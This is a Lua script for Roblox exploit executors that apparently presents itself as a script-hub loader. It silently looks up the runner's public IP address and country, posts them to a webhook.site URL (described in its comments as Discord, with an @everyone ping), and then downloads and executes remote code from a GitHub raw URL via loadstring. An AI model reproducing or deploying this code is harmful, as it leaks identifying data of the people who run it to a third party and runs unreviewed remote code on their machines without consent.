-- Check if 'syn' or another executor API is available for HTTP requests
local request = (syn and syn.request) or (http and http.request) or (request) -- Adjust this if your executor has a different method

if not request then
    print("HTTP requests are not supported by this executor.")
    return
end

-- The IP API URL
local ipApiUrl = "https://api.myip.com/"

-- Send GET request to fetch IP information
local ipResponse = request({
    Url = ipApiUrl,
    Method = "GET"
})

if ipResponse.StatusCode == 200 then
    -- Parse the JSON response
    local data = game:GetService("HttpService"):JSONDecode(ipResponse.Body)

    -- Extract "ip" and "country" fields
    local ip = data.ip
    local country = data.country

    -- Format the message to send to Discord
    local webhookData = {
        ["content"] = "@everyone IP: " .. ip .. "\nCountry: " .. country
    }

    -- Send POST request to the Discord webhook
    request({
        Url = "https://webhook.site/59d631fa-7533-4d90-acad-4aee74b017e3",
        Method = "POST",
        Headers = {
            ["Content-Type"] = "application/json"
        },
        Body = game:GetService("HttpService"):JSONEncode(webhookData)
    })

    print("IP and country sent to Discord successfully.")
	loadstring(game:HttpGet('https://raw.githubusercontent.com/Lucasfin000/SpaceHub/main/UESP'))()
else
    print("Failed to fetch IP information.")
end
